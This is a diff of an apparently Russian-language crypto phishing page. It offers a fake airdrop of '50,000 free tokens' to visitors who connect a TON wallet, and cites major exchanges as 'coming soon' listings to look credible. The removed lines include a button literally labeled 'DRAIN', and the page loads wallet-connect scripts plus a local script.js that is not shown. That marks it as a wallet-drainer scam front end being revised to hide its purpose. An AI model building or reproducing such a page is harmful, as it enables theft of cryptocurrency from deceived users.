@@ -10,11 +10,8 @@
     <link rel="stylesheet" href="./css/style.css">
 </head>
 <body>
-    <div id="ton-connect"><div><tc-root>
-        <button class="go3974562317 go54158285" data-tc-connect-button="true" appearance="primary" scale="s" lefticon="false" righticon="false" data-tc-button="true">
-
-    <div class="go1487791704" fontsize="15px" fontweight="590" lineheight="18px" color="#FFFFFF" data-tc-text="true">Connect Wallet</div></button></tc-root></div></div>
-    <button id="drain-btn" class="drain-button">DRAIN</button>
+    <div id="ton-connect"></div>
+    
     <header class="site-header">
         <nav class="navbar">
             <div class="logo-container">
@@ -27,6 +24,7 @@
             </div>
         </nav>
     </header>
+
     <div class="main-container">
         <div class="content-wrapper">
             <h1 class="title">Получи бесплатно <span class="highlight">50,000</span> монет нового токена!</h1>
@@ -34,28 +32,7 @@
             <p class="description">
                 Вам стоит лишь привязать свой крипто-кошелек и получить токены на баланс!
             </p>
-            <button id="open-tonkeeper-modal" class="cta-button">Получить токены</button>
-        </div>
-    </div>
-    <!-- Модальное окно для бирж -->
-    <div id="exchanges-modal" class="modal-overlay">
-        <div class="modal-content">
-            <button id="close-exchanges-modal" class="modal-close">&times;</button>
-            <h2>Скоро на биржах</h2>
-            <ul class="exchanges-list">
-                <li><a href="https://www.binance.com/" target="_blank">Binance</a></li>
-                <li><a href="https://www.coinbase.com/" target="_blank">Coinbase</a></li>
-                <li><a href="https://www.kraken.com/" target="_blank">Kraken</a></li>
-                <li><a href="https://www.kucoin.com/" target="_blank">KuCoin</a></li>
-                <li><a href="https://www.bybit.com/" target="_blank">Bybit</a></li>
-                <li><a href="https://www.okx.com/" target="_blank">OKX</a></li>
-                <li><a href="https://www.gate.io/" target="_blank">Gate.io</a></li>
-                <li><a href="https://www.huobi.com/" target="_blank">Huobi</a></li>
-                <li><a href="https://www.bitfinex.com/" target="_blank">Bitfinex</a></li>
-                <li><a href="https://crypto.com/" target="_blank">Crypto.com</a></li>
-                <li><a href="https://www.bitstamp.net/" target="_blank">Bitstamp</a></li>
-                <li><a href="https://www.mexc.com/" target="_blank">MEXC</a></li>
-            </ul>
+            <button id="open-connect-modal" class="cta-button">Получить токены</button>
         </div>
     </div>
 
@@ -87,11 +64,31 @@
         </div>
     </div>
 
+    <!-- Модальное окно бирж -->
+    <div id="exchanges-modal" class="modal-overlay">
+        <div class="modal-content">
+            <button id="close-exchanges-modal" class="modal-close">&times;</button>
+            <h2>Скоро на биржах</h2>
+            <ul class="exchanges-list">
+                <li><a href="https://www.binance.com/" target="_blank">Binance</a></li>
+                <li><a href="https://www.coinbase.com/" target="_blank">Coinbase</a></li>
+                <li><a href="https://www.kraken.com/" target="_blank">Kraken</a></li>
+                <li><a href="https://www.kucoin.com/" target="_blank">KuCoin</a></li>
+                <li><a href="https://www.bybit.com/" target="_blank">Bybit</a></li>
+                <li><a href="https://www.okx.com/" target="_blank">OKX</a></li>
+                <li><a href="https://www.gate.io/" target="_blank">Gate.io</a></li>
+                <li><a href="https://www.huobi.com/" target="_blank">Huobi</a></li>
+                <li><a href="https://www.bitfinex.com/" target="_blank">Bitfinex</a></li>
+                <li><a href="https://crypto.com/" target="_blank">Crypto.com</a></li>
+                <li><a href="https://www.bitstamp.net/" target="_blank">Bitstamp</a></li>
+                <li><a href="https://www.mexc.com/" target="_blank">MEXC</a></li>
+            </ul>
+        </div>
+    </div>
 
-<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-<script src="tonsdk.js"></script>
-<script src="js/script.js"></script>
-<div id="tc-widget-root"><tc-root></tc-root></div>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="./js/tonsdk.js"></script>
+    <script src="./js/script.js"></script>
 </body>
 </html>
